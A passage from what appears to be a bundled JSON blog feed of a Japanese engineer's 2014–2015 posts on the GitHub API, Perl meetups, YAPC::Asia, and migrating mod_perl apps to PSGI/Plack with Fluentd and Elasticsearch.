\'https://api.github.com/orgs/some_private/repos?access_token=${ACCESS_TOKEN}\'ドキュメントに各API発行に必要なscope(権限)が書いてあるので必要なscopeだけ付与してあげると良いです。perlでの選択肢今までで、APIアクセスする手段を得ることはできましたが、シェルスクリプトで処理を組み立てるのは、無謀なので、使い慣れてるプログラミング言語で実装したいところです。当社ではPerlを使い慣れてるエンジニアが多いので、ここではPerlのクライアントを紹介します。現在のところ以下の2つの選択肢があります。PithubNet::Github私はPithubを使っています。使い始めた時期においてPithubの方が更新されてそうだったからです。が、今見るとNet::Githubも更新されてるように見えます。他の言語での選択肢特にプログラミング言語にこだわりが無いのであれば、githubがメンテナンスしてるoctokitを使うと良いと思います。RubyとObjective C、.Netに対応してます。たぶん鉄板だと思います。(しかし、octokitのこのサンライズというかバンダイに怒られそうなデザインは大丈夫なのでしょうか?まとめ煩雑で定型的な作業はGithub APIで自動化すると良いPrivateな情報の操作はアクセストークンを発行してAPIを発行するPerlにはPithubとNet::Githubのクライアントライブラリがあるこだわりがなければ、クライアントはoctokit使うと良い明日は、 @mihyaeru21 さんです。iOS回りの面白いエントリが見れそうです。*1:プログラマの3大美徳の1つ","link":"https://blog.masasuzu.net/entry/2015/12/04/use_github_api","isoDate":"2015-12-04T14:47:44.000Z","dateMiliSeconds":1449240464000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"#gotandapm Gotanda.pm Perl Technology Conference #6 でLTしてきました。","contentSnippet":"gotanda-pm.connpass.comGotanda.pmでLTしてきました。今回のテーマは障碍でした。半分ネタのトークです。JSTQB Foundation Level のシラバスに載っているソフトウェアテストの7原則をもじったやつです。JSTQB認定テスト技術者資格-シラバス（学習事項）・用語集-言ってみれば、サービスに対して継続的にテストするのが監視なのでテストに対する原則が監視に対しても言えるんじゃないかなーという軽い思いつきから生まれました。無理矢理な部分もありましたが、わりかし当てはまってる部分もあったのではないかと思いました。トーク中美味しいにおいがしてきてつらかったです。(このエントリは懇親会の前に書かれてます)#gotandapm 美味しそうなにおいがして辛い。。。。— masasuzu? (@masasuz) September 17, 2015ガイアックスさん会場提供ありがとうございました。","link":"https://blog.masasuzu.net/entry/2015/09/17/Gotanda.pm6","isoDate":"2015-09-17T12:14:35.000Z","dateMiliSeconds":1442492075000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"#yapcasia YAPC::Asia 2015でボランティアスタッフしてきた","contentSnippet":"今年のYAPC::Asiaは終わった。つつがなく終わりました。過去のエントリを見直すと2011、2012年は書くのサボっていたみたいでした。私のYAPC::Asia初参加は2010年で6回目の参加でした。#yapcasia YAPC::Asia 2014でボランティアスタッフやってきました - 目の前に僕らの道があるmasasuzu.hatenablog.jp#yapcasia YAPC::Asia Tokyo 2013に参加してきました。 - 目の前に僕らの道があるmasasuzu.hatenablog.jpYAPC::Asia 2010へ行ってきたよ。 - 目の前に僕らの道があるmasasuzu.hatenablog.jp今年のYAPCとの関わり方は個人スポンサー+ボランティアスタッフとして参加しました。個人スポンサーとしては4年目、ボランティアスタッフとしては3年目でした。今年のYAPCもすごい楽しかったです。特にここ1,2年でPerl関係の人たちの知り合いがすごい増えたので、いろんな人と話ができてすごい楽しかったです。トークの方は例年スタッフ業をやっていると聞けないので、(会場にいてもスタッフのお仕事に意識が行くので内容を聞き取れてないことが多い)、動画が上がったら気になっていたトークを追いたいと思います。さて、だいたい6年前からWebで、Perlでお仕事するようになってからYAPCにはいろいろなものをもらってきました。だからこそ、ボランティアスタッフをやったり、個人スポンサーになって自分がもらったものを間接的に他の人に与えられたらいいなと思ってやってきました。自分がもらったものを他の人も受け取ってもらえたらなら良いなと思います。YAPC::Asiaはいったん終わります。それ自体いろいろ思うところがありますし、残念ではあります。YAPC::Asiaが無くなっても地域PMなどのPerlのコミュニティ自体が無くなるわけではないので私も細々とコミュニティ活動していきます。ただ、全国的にPerlな人が集まってくるイベントが今のところ来年無いのは寂しいところです。もしどこかで動きがあるならお手伝いさせていただければなと思います。YAPC::Asiaお疲れ様でした。(初日の懇親会の後の二次会でいろんな人に迷惑かけてしまったようなのでものすごく反省しています。すみません。お酒気を付けます。。。会期中のつぶやきいくつかおしゃれなカップだ #yapcasia pic.twitter.com/NwWw30i3HW— masasuzu? (@masasuz) August 22, 2015#yapcasia Perl6！ pic.twitter.com/2tJh6irctZ— masasuzu? (@masasuz) August 22, 2015#yapcasia  壇上から。お疲れさまでした！！ pic.twitter.com/1MiU56gE4R— masasuzu? (@masasuz) August 22, 2015","link":"https://blog.masasuzu.net/entry/2015/08/23/YAPC_Asia","isoDate":"2015-08-23T10:17:16.000Z","dateMiliSeconds":1440325036000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"#kichijojipm 吉祥寺.pmでLTしてきた","contentSnippet":"吉祥寺.pm (kichijojipm) #4 : ATNDatnd.org今回はPerlとPerl以外ということで、Perlの外の世界をつないでるもので一番最初に思いついたのがテンプレートエンジンだったので今回の発表になりました。自分のテンプレートの利用シーンは設定ファイルの自動生成ですね。テンプレートがあることで手作業で設定ファイルをいじる必要が基本的にはないので、手作業に起因ミスがないのが良いですよね。そのほかくりかえしの記述が必要なものもテンプレート使うと便利な場面が多いと思います。前回のLTが長すぎたので、真姫進行で行ったら、巻きすぎてしまいました。時間配分難しい。#kichijojipm 真姫すぎた。。— masasuzu? (@masasuz) July 10, 2015#kichijojipm 巻きすぎた。。— masasuzu? (@masasuz) July 10, 2015懇親会のお店はおしゃれな感じでさすが吉祥寺という感じでした。五反田とは違う。#kichijojipm 炙りマカレル pic.twitter.com/wpJTTnIvZF— masasuzu? (@masasuz) July 10, 2015他の人のスライドはこちらページからたどれると思います。吉祥寺.pm4終わりました - kichijojipm’s blogkichijojipm.hatenablog.com今回の吉祥寺.pmも楽しかったです。次回も参加したいです。余談1今回のKeynoteはAzusa Colorsを元にスライドを作りました。だいぶ良い感じにできました。ありがたいです。茜屋さんのイメージカラーのパープルを基調にしています。http://memo.sanographix.net/post/113681262780memo.sanographix.net余談2LTの途中で宣伝してましたが、五反田のモバイルファクトリーさんで7/31にCrystalの勉強会やるしいですよ。東京 Crystal 勉強会 #1 in 五反田 (2015/07/31 19:30〜)crystal.connpass.comGotandaは今技術的に熱い街です。そのほかGotanda.pmや五反田Perlみたいな勉強会も様々行われてます。","link":"https://blog.masasuzu.net/entry/2015/07/12/122011","isoDate":"2015-07-12T03:20:11.000Z","dateMiliSeconds":1436671211000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"2015年第二 四半期をふりかえる","contentSnippet":"7月にとうとうなりました。ざっくりふり返ります。お仕事mod_perl to PSGI/Plackこの四半期のメインタスクでした。弊社2事業部あるんですが、そのうちの片方の事業部のmod_perlアプリをPSGI/Plack化しました。後は事業部の人がちゃんとテストして、本番反映するだけです。もう一個の事業部のmod_perlアプリケーションは次の四半期に取りかかる予定です。雑感としては、mod_perl特有の機能はほぼ使ってないので、そんなに辛くは無かったです。どちらかというと、使っているモジュールが古すぎたり、SledgeのPlugin地獄だったりしてアプリの実装の方でちょこちょこはまることが多かったです。このあたりの話です。#gotandapm Gotanda.pm Perl Technology Conference #4 話してきた話 - 目の前に僕らの道があるmasasuzu.hatenablog.jpGitbucket地味にアップデートが出る度に追従してました。しかしながら、そこそこでかいレポジトリをGitbucketで管理するのはだいぶつらいことが見えてきました。まず、レポジトリブラウザが鬼のように重い。1日数10コミットするようなレポジトリだとまともに使えないので、ちょっと移行先を考えてます。Elasticsearch  + Kibana4Kibana4入れました。Kibana3もまだ稼働中ですが、Kibana4で十分かなという気分です。Kibana4はすごい便利なので、そのあたりの話もどこかで一度したいです。開発環境の改善OrePAN2::Serverを廃止して、社内モジュールは静的サーバ置いたり、一つサーバでマルチユーザが同居するようなレガシーな開発環境の改善とかもろもろやってました。この辺もあとでエントリ書きたいところ。新卒技術者のメンタリング新卒技術者に対して仕事外で困ってる事とかのお悩みの相談乗ったり、成長を促すお手伝いをしたいたりします。会社としてもメンター制度できたばっかりで、組織的にも自分的にもいろいろ手探り感があるのは確かです。自分が見ている人はかなり優秀で日々成長が見て取れるので、そこをさらに促せるようにしていけたらと思います。書いた記事こう見るとあまりエントリ残してないですね。もう少し書きたいところ。4月勉強会#kichijojipm 吉祥寺.pm #3 に参加してきました。 - 目の前に僕らの道がある技術ubuntu12.04でruby2.2.1のビルド失敗するのはlibffi-devが入ってないから - ふり返る暇なんて無いね$PATHを見やすく表示したい - ふり返る暇なんて無いね5月技術ポートが空いてるか調べたいとき - ふり返る暇なんて無いねサーバ起動時に/etc/init.d/ に設定があるデーモンを自動起動したい - ふり返る暇なんて無いねElasticsearchを1.4以上に上げたらkibana3がElasticsearchにConnection Failedする際の対処 - ふり返る暇なんて無いねポエム縮退運用という考え方 - ふり返る暇なんて無いねあなたは嫌いですか。でも僕は好きです。 - ふり返る暇なんて無いね6月勉強会#gotandapm Gotanda.pm Perl Technology Conference #5 でLTの高速化に失敗しました - 目の前に僕らの道がある技術MySQLのLINEAR KEY パーティションでPKで検索しても遅い場合 - ふり返る暇なんて無いねPerlモジュールのバージョン比較したい - ふり返る暇なんて無いねポエム普段の行動がものをいう - ふり返る暇なんて無いね判断と判断の変更 - ふり返る暇なんて無いね感覚値はあくまで感覚値 - ふり返る暇なんて無いね次の四半期お仕事的にはもう一個の事業部のPSGI/Plack化と開発環境の改善をメインにやってくと思います。ここ最近ちょっといろいろ腹に貯めすぎなので、もう少し心にゆとりをもっていけたらなとは思いまする。","link":"https://blog.masasuzu.net/entry/2015/07/03/2015_2_retrospective","isoDate":"2015-07-03T00:00:00.000Z","dateMiliSeconds":1435881600000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"他社の障害対応きにならNight! に行ってきた","contentSnippet":"エンジニア交流会〜他社の障害対応きにならNight!〜 on Zusaarwww.zusaar.com一昨日の話ですが、Gaiaxさんに行ってきました。内容に関してはけっこうグレーな感じなこともあるので、話せないのですが、あー、あるよねー。とか だいぶつらい。。。って話を聞けて楽しかったです。他山の石にしたいです。インシデント管理に関してはちょっと痛いところがあるので見直したいなと思いました。懇親会で深い話が聞けていろいろ学びがありました。すごい楽しかったので次回もあれば参加したいです。寿司 pic.twitter.com/RnLrH5mxlp— masasuzu? (@masasuz) June 30, 2015内容言えないけどすごい為になってる— masasuzu? (@masasuz) June 30, 2015だいぶつらい話聞いてるもの— masasuzu? (@masasuz) June 30, 2015炎上案件だ。。。— masasuzu? (@masasuz) June 30, 2015インシデント管理に関してはちょっと痛いところあるなと思った。— masasuzu? (@masasuz) June 30, 2015なかなかこういう他社の障害事例聞けないので、今日は楽しかった。— masasuzu? (@masasuz) June 30, 2015innodbのデータ圧縮すると並列性が犠牲になるってのは、初耳だったのでちゃんと調べたい。— masasuzu? (@masasuz) June 30, 2015","link":"https://blog.masasuzu.net/entry/2015/07/02/134402","isoDate":"2015-07-02T04:44:02.000Z","dateMiliSeconds":1435812242000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"#gotandapm Gotanda.pm Perl Technology Conference #5 でLTの高速化に失敗しました","contentSnippet":"Gotanda.pm Perl Technology Conference #5 (2015/06/24 19:30〜)gotanda-pm.connpass.comGtanda.pmでLTしてきました。#gotandapm LTの高速化に失敗しました。— masasuzu? (@masasuz) June 24, 2015内容としてはPlack Applicationのアクセスログの話です。アクセスログそのものの話アクセスログの収集の話アクセスログの可視化/集計の話1個目の論点しか話せませんでした。猛省します。次回は事故らずに話したいです。最近Kibana4とElasticsearchを使っていてだいぶアクセスログに限らず ログ解析が捗っているので、その辺も別の機会に話せたらと思います。他の人の発表では、skajiさんの Acme::CPAN::Installerの発表がすごかったです。cpanモジュールをインストール出来るとこんなに速くなるのかと感心しました。業務で使いたいと思うくらいには速かったです。そのほかの人の発表も楽しく聞かせてもらいました。gotandapm参加者の皆さん！吉祥寺.pm4は、まだまだ参加者募集中です！https://t.co/JwGFxDOnXi#kichijojipm #gotandapm— magnoliak (@magnolia_k_) June 24, 2015どうやら吉祥寺.pm 来月開催らしいですよ。","link":"https://blog.masasuzu.net/entry/2015/06/25/184549","isoDate":"2015-06-25T09:45:49.000Z","dateMiliSeconds":1435225549000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"#kichijojipm 吉祥寺.pm #3 に参加してきました。","contentSnippet":"吉祥寺.pm行ってきました。吉祥寺.pm (kichijojipm) #3 : ATNDatnd.org今回はツールチェインがテーマと言うことで、Minillaの話題が2件ほどあって、参考になりました。今回特によかったなと思ったのがpapixさんの新人研修の話でした。ガイアックスさんはここ二年くらいで新人研修を整備し始めたそうで、だいぶ充実した内容をやっていそうなので、こっそり参加したいです。#kichijojipm ガイアックスに新人研修受けに行きたい— masasuzu? (@masasuz) April 17, 2015話の中で研修資料をスライドじゃ無くてドキュメントとして残すってのが、印象に残ってます。OJTが基本なのですが、開発グループのエンジニアの有志が社内勉強会枠の時間*1で新人さんに最低限知っておいて欲しい技術基礎の勉強会を行っています。wikiに残しておいて、次年度使い回せるように + 中途の人が入ってきたときも一通り見れば分かるようにしてます。その辺、アプローチが似ているなと思います。さておき、今回も楽しかったです、上級者向けの話からperl少し書ける人でも役に立つ話まで聞けてレベル感的にも良い感じです。主催のmagnoliakさん、htk291さんありがとうございました。次回の吉祥寺.pm楽しみにしてます。吉祥寺.pm in 五反田楽しみにしてます!!!五反田で吉祥寺.pmとか。— 吉祥寺.pm (@kichijojipm) April 17, 2015参照吉祥寺.pm3終わりました - kichijojipm’s blogkichijojipm.hatenablog.com余談SSID: TMNetwork がいてふいた— masasuzu? (@masasuz) April 17, 2015*1:弊社、毎日終業定時前の1時間は勉強会の時間と会議室が確保されていて、好きにやって良いことになってる。もちろん毎日は開かれない","link":"https://blog.masasuzu.net/entry/2015/04/19/kichijoji.pm-3","isoDate":"2015-04-19T06:59:42.000Z","dateMiliSeconds":1429426782000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"2015年第一四半期をふりかえる","contentSnippet":"そろそろ3月も終わりそうなので、軽くまとめてみる。お仕事Slack連携ツール昨年末から1月にかけては、社内のチャットツールをIRCからSlackに移すためにもろもろの連携ツールを書いていました。WevService::Slack::IncomingWebHookはそういう事情で書いたコードです。WebService::Slack::IncomingWebHookというモジュールを書いてCPAN Authorとやらになったようです - 目の前には僕らの道があるmasasuzu.hatenablog.jp連携ツール自体は、Irisというプロジェクトコードで、HTTPでSlackへIncoming webhookを投げたり、SlackからOutgoing webhookを受けたりするProxy的なものです。コードは公開してないです。mod_perl to PSGI/Plack2月3月はmod_perlなプロジェクトをPSGI/Plack+Carton化をひたすらしていた感じです。このタスク自体は半期で終わらす予定なので、次の四半期も継続案件です。前回のGotanda.pmで話した件ですね。#gotandapm Gotanda.pm Perl Technology Conference #4 話してきた話 - 目の前には僕らの道があるmasasuzu.hatenablog.jp書いた記事1月H2データベースの話はGitbucketのDBの調子が悪くていったんデータをダンプしてDBファイルを作り直さなきゃいけなかった時の話のハズ。2014年に使った技術 - 目の前には僕らの道があるsudo -Hと環境変数($PATH)ではまった話 - ふり返る暇なんて無いねH2データベースのダンプ、リストアをする - ふり返る暇なんて無いね#chibapm Chiba.pm #6 に参加してきた - 目の前には僕らの道がある2月tmuxでwindow番号を変更したい - ふり返る暇なんて無いねperl5.16から overloadが\\"overload arg \'\\"\' is invalid \\"みたいなwarningを吐き出した - ふり返る暇なんて無いね情報共有に関してもやもや思ってること - ふり返る暇なんて無いね3月3月はちょっと古めのコードをいろいろいじっててはまっていたらしいですね。Perl 5.18からsmart matchはexperimentalなので使わないで - ふり返る暇なんて無いねとあるプロジェクトのコードのあんちぱたーん - ふり返る暇なんて無いねDebian Packageのバージョンを比較したい。 - ふり返る暇なんて無いね開発二部でLTしてきた #でぶつー - 目の前には僕らの道があるFurl::S3でSSL接続エラーが出る件 - ふり返る暇なんて無いね#gotandapm Gotanda.pm Perl Technology Conference #4 話してきた話 - 目の前には僕らの道がある設定と処理をわけるということ - ふり返る暇なんて無いねUbuntu 12.04で/tmpがおかしくてうまく起動しなかった件 - ふり返る暇なんて無いね次の四半期お仕事的には引き続きmod_perlを無くしていく作業を続けていると思います。お仕事外で現状これといってやりたいことはないんですが、最近仕事外のコードをあまり書いてないので、その辺少し改善できたらなとは思いまする。","link":"https://blog.masasuzu.net/entry/2015/03/30/2015_1_retrospective","isoDate":"2015-03-30T01:00:00.000Z","dateMiliSeconds":1427677200000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"#gotandapm Gotanda.pm Perl Technology Conference #4 話してきた話","contentSnippet":"Gotanda.pm Perl Technology Conference #4 (2015/03/25 19:30〜)gotanda-pm.connpass.comだいぶ昔のmod_perlで動いているプロジェクトをPSGI/Plack化するために現在進行形で作業してるよという話です。直前に書き上げてリハーサル全くしないまま本番で話したので、全然時間が足りなかったです。#gotandapm つらいしか言わずに終わってしまった— masasuzu? (@masasuz) March 25, 2015さて、古いmod_perlなプロジェクトも新しめのプロジェクトと同じスキームに載せて動くように現在進行形で動いているところです。それはそれとして大人のGotanda.pmも面白そうですね。とはいえ、ソンナニ闇ハカカエテナイデスヨ。全然。大人のGotanda.pmとかやって, GXやMFのインフラ部署の人に闇語ってもらいたい #gotandapm— パブリシティ権放棄型 (@__papix__) March 25, 2015ちなみに、新しめのプロジェクトで使っているスキームはそういえば、Gotanda.pm #1で話したくらいに作っていたようです。#gotandapm Gotanda.pm Perl Technology Conference #1に参加した LTした - 目の前には僕らの道があるmasasuzu.hatenablog.jp会場をお貸しいただいたGaiaxさんありがとうございました。運営のみなさんもお疲れ様でした。ありがとうございました。Gotanda.pmお疲れ様でした. 会場やUstreamは如何でしたでしょうか. 今回のように, 弊社セミナールームは勉強会会場として貸し出す事も出来ますので, 使ってみたいという方は @__papix__ までご連絡下さい. #gotandapm— パブリシティ権放棄型 (@__papix__) March 25, 2015蛇足ですが、Gaiaxさんのすぐ近くの麺彩房の油そば好きです。五反田ぴーえむ pic.twitter.com/6UBO7Y6fDi— masasuzu? (@masasuz) March 25, 2015","link":"https://blog.masasuzu.net/entry/2015/03/26/gotanda.pm_4","isoDate":"2015-03-26T13:38:13.000Z","dateMiliSeconds":1427377093000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"開発二部でLTしてきた #でぶつー","contentSnippet":"開発二部という社内の部活でLTをしてきました。最近古めのプロジェクトを多少モダンにするタスクをしてるので、そのあたりで得た知見を書いてます。特に何かを批判したいわけではなく、こういうのはよくないから、新しいプロジェクトではこういうことは避けると幸せになりやすいよと言いたいだけです。よくないコードは直すだけです。ただdisって何もしないのはよくないですし、そういうことをしたいわけではないです。","link":"https://blog.masasuzu.net/entry/2015/03/17/220240","isoDate":"2015-03-17T13:02:40.000Z","dateMiliSeconds":1426597360000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"#chibapm Chiba.pm #6 に参加してきた","contentSnippet":"行ってきました。Chiba.pm #6 : ATNDChiba.pm #6 : ATNDCPAN Authorになったのでその辺の話をLTしてきました。前にエントリを書いた話です。Minilla便利でした。Chiba.pmなのにPerlの話をしてすみませんでした。。。。久しぶりのChiba.pm楽しかったです。マグロ美味しかったです。次回も楽しみです。過去のchiba.pm#chibapm Chiba.pm #5 でログ回りのことを聞きたかった - 目の前には僕らの道があるchiba.pm 2回目に行ってきた #chibapm - 目の前には僕らの道がある#chibapm #1に行ってきた。 - 目の前には僕らの道がある","link":"https://blog.masasuzu.net/entry/2015/01/28/chiba.pm_6","isoDate":"2015-01-28T09:15:39.000Z","dateMiliSeconds":1422436539000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"2014年に使った技術","contentSnippet":"ざっくりと去年使った技術をざっくりふりかえってみる。ホントにざっくりです。PSGI/Plack今働いている会社のwebサービスのバックエンドはperlで動いています。そしてそれらのアプリケーションはmod_perl上で動くようになっていました。*1があってそろそろmod_perl卒業したいよねと検証自体は重ねていたんですが、年初くらいに都合よくほかのサービスに影響を与えることのない小規模な新規プロジェクト*2を作ることになりました。もの自体は1週間くらいでくみ上げました。ここで組んだベースアーキテクチャが以降のPSGI/Plackのプロジェクトのベースになっています。Perl::Build / xbuildtagomoris/xbuild \xb7 GitHubPerl::Build - perl builder - metacpan.orgperlに依存するとディストリビューションやOSを変える度にperlのバージョンが変わっていろいろ面倒なので、PSGI/Plack化したプロジェクトではperlを独自にビルドするようにしてます。perl-buildでビルドしたperlをdebian package化して使っています。各サーバでperlをビルドするのは時間の無駄遣いなのでdebで配布します。CartonCarton - Perl module dependency manager (aka Bundler for Perl) - metacpan.orgsystem perlを使っていたときは、perl moduleもdebian packageで入れていたんですが、独自ビルドするようになったので、モジュール管理にcartonを使ってます。OrePAN2::ServerOrePAN2::Server - DarkPAN Server - metacpan.org基本社内モジュールは作らない/作らせない/CPANに上げやがれという方針ですが、どうしても外には出せない社内ロジックがあるのでそういうものを置く場所として使っています。UpstartUbuntuで動いているサービスのデーモン管理はupstartに基本任せています。設定ファイル書くの簡単で、癖がそんなにないので重宝しているんですが、なんか次のUbuntuからsystemdに移行するみたいな話があってだいぶ辛い予感がしてます。FluentdFluentdを全サーバに導入しました。今まで各サーバに入ってgrep/wc/sed/tailを駆使してログ解析していたアプリケーションログ(イベントログ)、アクセスログ、エラーログを1つの場所に集約できるようになってだいぶ捗ってます。アクセスログに関しては最終的にvhost毎と vhostとstatus code(4xx,5xxxのみ)毎にファイルを分けて出力するようにしてるので、アクセスログ解析が今までよりだいぶ捗るようになりました。だいぶライフチェンジングです。Elasticsearch / KibanaFluentd入れた時点でだいぶログ回りは快適になったんですが、それでも最終的なログのストア先はファイル*3なのでアプリから扱うには少し不便とか諸事情あったので、いろいろ検証した上でElasticsearchを入れました。GitBuckettakezoe/gitbucket \xb7 GitHubgitレポジトリへのアクセスは基本sshを使っていたんですが、開発者以外の企画者やデザイナもgitを使うようになってきて、いろいろアカウント管理の問題が出てきて素のままgit使うのはちょっと管理上つらいというのがきっかけでその辺解消するために導入したのがgithub cloneのGitBucketでした。レポジトリブラウザとしてよいのですが、歴史が深いレポジトリとかだとだいぶ重かったりするのが少し難点です。Slack試験導入中です。正直別にIRCでもよくね?感がまだあります。デフォルトでwebから見れるという点は便利なような気がしなくもないです。なんかほかにもやったような気がしますが、去年はざっくりこんなことしていたらしいです。*1:system perlにはもう依存したくないよねとかいろいろ。察してください*2:ちなみにStartDash(START:DASH!!)というプロジェクトコードを付けていた。察してください*3:一定ファイル容量でローテートされる。そしてgzip圧縮してるのとしてないの(バッファ)が混じってる","link":"https://blog.masasuzu.net/entry/2015/01/04/142926","isoDate":"2015-01-04T05:29:26.000Z","dateMiliSeconds":1420349366000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"2014年の自分が書いた技術エントリふりかえり","contentSnippet":"書いたエントリのリンクを貼り付けるだけの雑なふりかえりです。一応自分の技術ブログが2つあって、ここが勉強会のエントリや、わりかしまとまった技術に関して書くところ。もうひとつ(ふり返る暇なんて無いね)の方がゆるふわにメモやポエムを書いていく方。1月PERL_CARTON_MIRRORをOrePAN2::Serverに向けてcarton installすると怒られる - ふり返る暇なんて無いね2月この時期なにやっていたっけ?全く記憶に無い3月hostnameコマンドメモ - ふり返る暇なんて無いねfluent-plugin-forestを使いつつ、tag_partsが複数あるときにpathにtag_partsを含めたときに、same buffer_pathを使っていると怒られる。 - ふり返る暇なんて無いねエンジニアでもターミナル作業ログを残したい!! - 目の前には僕らの道がある4月プロセスが開いているファイルディスクリプタ数を知りたい - ふり返る暇なんて無いねプロセスがオープン可能なファイルディスクリプタを知りたい - ふり返る暇なんて無いねUbuntu12.04のapproxはinetd経由で立ち上がる件 - ふり返る暇なんて無いねLINE Developer Conference(テーマ：インフラ)にいってきたメモ - 目の前には僕らの道がある5月carton installするたびにcpanfile.snapshotが更新されるのがうざったい - ふり返る暇なんて無いね6月キャッシュ(しない)戦略 - ふり返る暇なんて無いね溜まるジョブキュー - ふり返る暇なんて無いねinnodb_log_file_sizeを気軽に変えると死ぬよ - ふり返る暇なんて無いね監視の閾値の考え方1 - ふり返る暇なんて無いねこのあたりはポエムを書きたいお年頃だったようだ。#五反田Perl でもくもくしてきた。perlのコードはほとんど書いてない。 - 目の前には僕らの道がある#gotandapm Gotanda.pm Perl Technology Conference #1に参加した LTした - 目の前には僕らの道がある五反田が熱くなり始めたのもこの頃。7月コマンドの出力結果の一時ファイルを作りたくなったら、プロセス置換を思い出すと良いかも知れない - ふり返る暇なんて無いね8月#でぶつー 五反田もくもく会 #1 に行ってきた - 目の前には僕らの道があるマニュアルオペレーションするとき気を付けたいこといくつか - ふり返る暇なんて無いね-で始まるファイルを消す方法 - ふり返る暇なんて無いねUbuntu 12.04でGitBucketを使うメモ - ふり返る暇なんて無いね#yapcasia YAPC::Asia前夜祭でインスピレーションを得てきた - ふり返る暇なんて無いね8月末はYAPC Asiaでした。今年もスタッフやってました。9月#yapcasia YAPC::Asia 2014でボランティアスタッフやってきました - 目の前には僕らの道がある#gotandago Gotanda.go #1 行ってきた - 目の前には僕らの道があるエイリアスを使わないでコマンド実行するいくつかの方法 - 目の前には僕らの道がある#gotandapm Gotanda.pm Perl Technology Conference #2 に行ってきた - 目の前には僕らの道があるgolangに興味を持ち始めたのはこの頃、来年こそはちゃんと使えるようにしたい。10月boot2dockerでexposeされるportはlocalhostのportじゃないよ - ふり返る暇なんて無いね#chibapm Chiba.pm #5 でログ回りのことを聞きたかった - 目の前には僕らの道があるこの時期、Elasticsearchまわりでいろいろはまってたはずなのに一切アウトプットが無いな。。。。11月不思議な時間にlogrotateしているその理由は。 - ふり返る暇なんて無いねconnectがhomebrewで入らなくなったので自前でビルドする - ふり返る暇なんて無いね#perlcasual PerlCasual #06 行ってきた(だいぶ昔の話 - 目の前には僕らの道がある#kichijojipm 吉祥寺.pm #1 に行ってきました (だいぶ昔の話 - 目の前には僕らの道がある12月WebService::Slack::IncomingWebHookというモジュールを書いてCPAN Authorとやらになったようです - 目の前には僕らの道があるねんがんのCPAN Authorになったぞ!こう見てみると、今年もアウトプット量が足りないなという印象。実際業務でいろいろはまっていたはずなのに、そのことがまったく書かれてないので、もう少しメモ書きレベルでもいいので残していきたい。というのが来年の課題。ソースコードでのアウトプットももっとがんばらないと。良いお年をー。","link":"https://blog.masasuzu.net/entry/2014/12/29/2014_retrospective","isoDate":"2014-12-29T07:27:23.000Z","dateMiliSeconds":1419838043000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"}]')}}]);